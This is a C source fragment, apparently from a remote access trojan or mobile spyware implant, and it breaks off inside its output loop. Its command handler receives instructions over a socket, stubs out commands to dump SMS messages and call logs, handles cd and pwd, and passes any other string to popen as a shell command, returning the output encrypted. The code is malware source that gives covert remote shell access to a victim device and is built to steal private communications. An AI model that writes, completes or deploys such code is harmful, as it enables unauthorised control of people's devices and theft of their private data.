void handle_command(int fd, const char* cmd, const char* key) {
    if (strncmp(cmd, "dump_sms", 8) == 0) {
        send_enc(fd, "SMS Dump (Not Implemented)", 26, key);
    } else if (strncmp(cmd, "dump_calls", 10) == 0) {
        send_enc(fd, "Call Log Dump (Not Implemented)", 31, key);
    } else if (strncmp(cmd, "cd ", 3) == 0) {
        if (chdir(cmd + 3) == 0) {
            send_enc(fd, "\n", 1, key);
        } else {
            send_enc(fd, "cd failed", 9, key);
        }
    } else if (strcmp(cmd, "pwd") == 0) {
        char cwd[1024];
        if (getcwd(cwd, sizeof(cwd)) != NULL) {
            send_enc(fd, cwd, strlen(cwd), key);
        } else {
            send_enc(fd, "pwd failed", 10, key);
        }
    } else {
        FILE* fp = popen(cmd, "r");
        if (!fp) {
            send_enc(fd, "Failed to execute", 17, key);
            return;
        }
        char buffer[1024];
        size_t n;
        while ((n = fread(buffer, 1, sizeof(buffer) - 1, fp)) > 0) {
            buffer[n] = '\0';
            send_enc(fd, buffer, n, key);
